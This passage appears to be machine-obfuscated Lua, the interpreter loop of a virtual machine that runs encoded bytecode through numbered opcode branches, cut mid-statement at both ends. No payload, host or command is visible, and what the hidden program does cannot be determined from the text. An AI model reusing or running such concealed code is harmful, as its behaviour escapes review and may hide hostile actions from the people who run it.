A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];else local D;local a;local c;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];if not e[o[2]]then d=d+1;else d=d+o[3];end;end;elseif c<=245 then if c<=243 then local n=e[o[3]];if not n then d=d+1;else e[o[2]]=n;d=d+l[d+1][3]+1;end;elseif c==244 then local D;local a;local c;local C;local A;e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];d=d+o[3];else if(e[o[2]]==n[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=246 then e[o[2]]=e[o[3]]-n[o[5]];elseif c>247 then e[o[2]]=K(E[o[3]],nil,f);else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]();B=c;end;elseif c<=289 then if c<=268 then if c<=258 then if c<=253 then if c<=250 then if c>249 then e[o[2]][n[o[3]]]=n[o[5]];else local D;local a;local A;local C;local c;local f;f=o[2];c=e[o[3]];e[f+1]=c;e[f]=c[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];C={};A=0;a=f+o[3]-1;for o=f+1,a do A=A+1;C[A]=e[o];end;D={e[f](r(C,1,a-f))};a=f+o[5]-2;A=0;for o=f,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];f=o[2];c=e[o[3]];e[f+1]=c;e[f]=c[n[o[5]]];end;elseif c<=251 then if(e[o[2]]<e[o[5]])then d=d+1;else d=d+o[3];end;elseif c==252 then e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;end;elseif c<=255 then if c>254 then C[o[3]]=e[o[2]];else local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=256 then if(n[o[2]]<e[o[5]])then d=d+1;else d=d+o[3];end;elseif c>257 then e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]==e[o[5]])then d=d+1;else d=d+o[3];end;else local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=263 then if c<=260 then if c==259 then e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else local d=o[2];local n={};local l=0;local o=d+o[3]-1;for o=d+1,o do l=l+1;n[l]=e[o];end;e[d](r(n,1,o-d));B=d;end;elseif c<=261 then local J;local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;elseif c>262 then local A;local D,A;local c;local A;local C;local a;a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else local A;local D,A;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];end;elseif c<=265 then if c==264 then local o=o[2];local n={};local d=0;local l=B;for o=o+1,l do d=d+1;n[d]=e[o];end;e[o](r(n,1,l-o));B=o;else local A;local D,A;local c;local A;local C;local a;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=266 then local B;local A;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];B=e[o[3]];e[A+1]=B;e[A]=B[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c==267 then e[o[2]]=e[o[3]]%e[o[5]];else local J;local a;local c;local D;local A;A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];if e[o[2]]then d=d+1;else d=d+o[3];end;end;elseif c<=278 then if c<=273 then if c<=270 then if c==269 then local a;local D;local c;local f;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+n[o[5]];d=d+1;o=l[d];A=o[2];C={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;C[f]=e[o];end;D={e[A](r(C,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=D[f];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];A=o[2];c=A+o[3]-2;a={};f=0;for o=A,c do f=f+1;a[f]=e[o];end;do return r(a,1,f)end;else local D;local J;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do 